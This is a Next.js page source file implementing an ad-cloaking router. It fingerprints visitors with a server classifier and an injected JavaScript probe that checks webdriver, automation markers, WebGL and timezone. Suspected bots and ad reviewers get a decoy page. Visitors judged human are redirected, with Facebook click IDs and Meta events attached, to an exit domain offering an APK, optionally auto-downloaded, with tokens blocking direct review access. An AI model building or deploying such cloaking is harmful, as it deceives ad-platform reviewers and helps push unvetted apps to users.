import { notFound, redirect } from "next/navigation";
import { headers, cookies } from "next/headers";
import {
  type LandingRoute,
  getRouteByEntry,
  getRouteByExit,
  getPromoForRoute,
} from "@/lib/db";
import { getClientIp, recordVisitFast } from "@/lib/visit";
import ExitLanding from "@/components/ExitLanding";
import { getMetaBrowserConfig } from "@/lib/meta-config";
import { sendMetaEvent } from "@/lib/meta";
import {
  classifyServerSync,
  routeCloakEnabled,
  routeDecoyConfig,
} from "@/lib/cloak";
import {
  getClientTokenKey,
  issueTransferToken,
  verifyHumanToken,
  verifyTransferToken,
  HUMAN_COOKIE,
  PROBED_COOKIE,
} from "@/lib/token";
import { normalizeUploadImagePath } from "@/lib/uploads";

export const dynamic = "force-dynamic";
export const runtime = "nodejs";

// 取请求 Host(去掉端口)
function getHost(h: Headers): string {
  const host = h.get("host") || "";
  return host.split(":")[0].toLowerCase();
}

// 探针 JS（移植自 cloak-router/templates.go loadingTmpl）
function ProbePage({ routeId, promo, fbclid }: { routeId: number; promo: string; fbclid: string }) {
  const verifyUrl = `/api/cloak/verify?route=${routeId}${promo ? `&c=${encodeURIComponent(promo)}` : ""}${fbclid ? `&fbclid=${encodeURIComponent(fbclid)}` : ""}`;
  const script = `
(async function(){
  function webglVendor(){
    try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(!gl)return'';var e=gl.getExtension('WEBGL_debug_renderer_info');
      return e?String(gl.getParameter(e.UNMASKED_VENDOR_WEBGL)):'';}catch(_){return'';}
  }
  function webglRenderer(){
    try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(!gl)return'';var e=gl.getExtension('WEBGL_debug_renderer_info');
      return e?String(gl.getParameter(e.UNMASKED_RENDERER_WEBGL)):'';}catch(_){return'';}
  }
  var notifQ='';
  try{if(navigator.permissions&&navigator.permissions.query){
    var st=await navigator.permissions.query({name:'notifications'});notifQ=st.state;}}catch(_){}
  var nav=navigator;
  var uaPlatform='';
  try{uaPlatform=(nav.userAgentData&&nav.userAgentData.platform)||'';}catch(_){}
  var p={
    js:true,
    webdriver:nav.webdriver===true,
    automation:!!(window._phantom||window.__nightmare||window.callPhantom||
      Object.keys(window.document||{}).some(function(k){return k.indexOf('cdc_')===0;})||
      Object.keys(window).some(function(k){return k.indexOf('cdc_')===0;})),
    hasChrome:!!window.chrome,
    webglVendor:webglVendor(),
    webglRenderer:webglRenderer(),
    plugins:(nav.plugins&&nav.plugins.length)||0,
    hc:nav.hardwareConcurrency||0,
    dm:nav.deviceMemory||0,
    sw:screen.width||0,sh:screen.height||0,
    dpr:window.devicePixelRatio||1,
    tz:(Intl&&Intl.DateTimeFormat)?Intl.DateTimeFormat().resolvedOptions().timeZone:'',
    platform:nav.platform||'',
    uaPlatform:uaPlatform,
    langs:(nav.languages&&nav.languages[0])||nav.language||'',
    notif:(window.Notification&&Notification.permission)||'',
    notifQ:notifQ,
    touch:nav.maxTouchPoints||0
  };
  try{
    var r=await fetch('${verifyUrl}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
    var d=await r.json().catch(function(){return{};});
    if(d.next==='real'&&d.target){location.replace(d.target);return;}
    if(d.human===true||d.next==='real'||d.next==='fake'){location.reload();return;}
    document.body.innerHTML='<div style="font-family:sans-serif;color:#666;display:flex;height:90vh;align-items:center;justify-content:center">Verification failed. Please refresh and try again.</div>';
  }catch(_){
    document.body.innerHTML='<div style="font-family:sans-serif;color:#666;display:flex;height:90vh;align-items:center;justify-content:center">Loading failed. Please refresh and try again.</div>';
  }
})();
`;

  return (
    <main
      style={{
        fontFamily: "sans-serif",
        color: "#666",
        display: "flex",
        minHeight: "90vh",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div>Loading, please wait...</div>
      <script dangerouslySetInnerHTML={{ __html: script }} />
    </main>
  );
}

export default async function Page({
  searchParams,
}: {
  searchParams: { c?: string; ht?: string; fbclid?: string };
}) {
  const h = headers();
  const host = getHost(h);
  const promo = (searchParams.c || "").trim();
  const fbclid = (searchParams.fbclid || "").trim();
  const transferToken = (searchParams.ht || "").trim();

  // ---- 主域名:进后台 ----
  const main = (process.env.MAIN_DOMAIN || "").toLowerCase();
  if (host === main) {
    redirect("/admin");
  }

  const entryRoute = getRouteByEntry(host);
  const exitRoute = getRouteByExit(host);
  const route = entryRoute || exitRoute;

  // 未命中启用线路时，入口/出口域名都应直接失效。
  if (!route) notFound();

  if (exitRoute && routeCloakEnabled(exitRoute)) {
    const exitTokenAccepted = verifyExitTransferToken(exitRoute, h, transferToken);
    if (!exitTokenAccepted) {
      await recordRouteVariant(exitRoute, "fake", "出口缺少真实访问令牌", h, promo);
      return routeDecoyResponse(exitRoute, promo);
    }
  }

  const cloakResult = exitRoute ? null : await guardRouteCloak(route, h, promo, fbclid);
  if (cloakResult) return cloakResult;

  if (exitRoute) {
    const promoRow = promo ? getPromoForRoute(exitRoute.id, promo) : null;
    return (
      <ExitLanding
        apkUrl={promoRow?.apk_url || exitRoute.apk_url}
        imageUrl={normalizeUploadImagePath(exitRoute.image_path)}
        title={exitRoute.title || "下载"}
        autoDownload={exitRoute.auto_download === 1}
        promo={promoRow ? promoRow.code : promo}
        meta={getMetaBrowserConfig(exitRoute)}
      />
    );
  }

  const promoRow = promo ? getPromoForRoute(route.id, promo) : null;
  const effectivePromo = promo && promoRow ? promoRow.code : "";
  const realReason = routeCloakEnabled(route) ? "真人令牌通过" : "分流关闭";

  let visitId = 0;
  try {
    visitId = recordVisitFast({
      route_id: route.id,
      promo_code: effectivePromo,
      page_variant: "real",
      cloak_reason: realReason,
      entry_domain: host,
      exit_domain: realTargetLabel(route),
      headers: h,
    });
  } catch {
    // 记录失败不阻塞跳转
  }
  const target = buildRealTargetUrl(route, h, effectivePromo, visitId, fbclid);
  if (route.real_target_type === "external" && visitId) {
    void sendMetaEvent({
      route,
      eventName: "ViewContent",
      eventId: `vc_${visitId}`,
      headers: h,
      eventSourceUrl: target.toString(),
      fbclid,
    });
  }
  redirect(target.toString());
}

function realTargetLabel(route: LandingRoute): string {
  return route.real_target_type === "external" ? route.external_url : route.exit_domain || "";
}

function buildRealTargetUrl(route: LandingRoute, h: Headers, promo: string, visitId: number, fbclid: string): URL {
  if (route.real_target_type === "external") {
    const target = new URL(route.external_url);
    if (promo) target.searchParams.set("c", promo);
    if (fbclid) target.searchParams.set("fbclid", fbclid);
    return target;
  }

  if (!route.exit_domain) notFound();
  const target = new URL(`https://${route.exit_domain}/`);
  if (promo) target.searchParams.set("c", promo);
  if (visitId) target.searchParams.set("v", String(visitId));
  if (fbclid) target.searchParams.set("fbclid", fbclid);
  if (routeCloakEnabled(route)) {
    target.searchParams.set("ht", buildExitTransferToken(route, h));
  }
  return target;
}

function buildExitTransferToken(route: LandingRoute, h: Headers): string {
  const ip = getClientIp(h);
  const clientKey = getClientTokenKey(h, ip);
  return issueTransferToken(clientKey, 120, exitTransferScope(route));
}

function verifyExitTransferToken(route: LandingRoute, h: Headers, token: string): boolean {
  if (!routeCloakEnabled(route) || !token) return false;
  const ip = getClientIp(h);
  const clientKey = getClientTokenKey(h, ip);
  return verifyTransferToken(token, clientKey, exitTransferScope(route));
}

function exitTransferScope(route: LandingRoute): string {
  return `route:${route.id}:exit:${route.exit_domain}`;
}

async function guardRouteCloak(
  route: LandingRoute,
  h: Headers,
  promo: string,
  fbclid: string
) {
  if (!routeCloakEnabled(route)) return null;

  const ip = getClientIp(h);
  const clientKey = getClientTokenKey(h, ip);
  const jar = cookies();
  const humanToken = jar.get(HUMAN_COOKIE)?.value || "";
  const probedCookie = jar.get(PROBED_COOKIE)?.value || "";
  const isHuman = humanToken && verifyHumanToken(humanToken, clientKey, `route:${route.id}`);

  if (isHuman) return null;

  if (probedCookie === "0") {
    await recordRouteVariant(route, "fake", "JS 探针未通过", h, promo);
    return routeDecoyResponse(route, promo);
  }

  const verdict = classifyServerSync(h);
  if (verdict.decision === "bot") {
    await recordRouteVariant(route, "fake", verdict.reason, h, promo);
    return routeDecoyResponse(route, promo);
  }

  await recordRouteVariant(route, "probe", "需 JS 探针确认", h, promo);
  return <ProbePage routeId={route.id} promo={promo} fbclid={fbclid} />;
}

async function recordRouteVariant(
  route: LandingRoute,
  pageVariant: "fake" | "probe",
  reason: string,
  h: Headers,
  promo: string
) {
  try {
    const promoRow = promo ? getPromoForRoute(route.id, promo) : null;
    recordVisitFast({
      route_id: route.id,
      promo_code: promoRow ? promoRow.code : "",
      page_variant: pageVariant,
      cloak_reason: reason,
      entry_domain: route.entry_domain,
      exit_domain: realTargetLabel(route),
      headers: h,
    });
  } catch {
    // 记录失败不影响分流响应
  }
}

function routeDecoyResponse(route: LandingRoute, promo: string) {
  const decoy = routeDecoyConfig(route);
  return (
    <ExitLanding
      apkUrl={decoy.apkUrl}
      imageUrl={decoy.imageUrl}
      title={decoy.title}
      autoDownload={false}
      promo={promo}
      trackDownload={false}
    />
  );
}
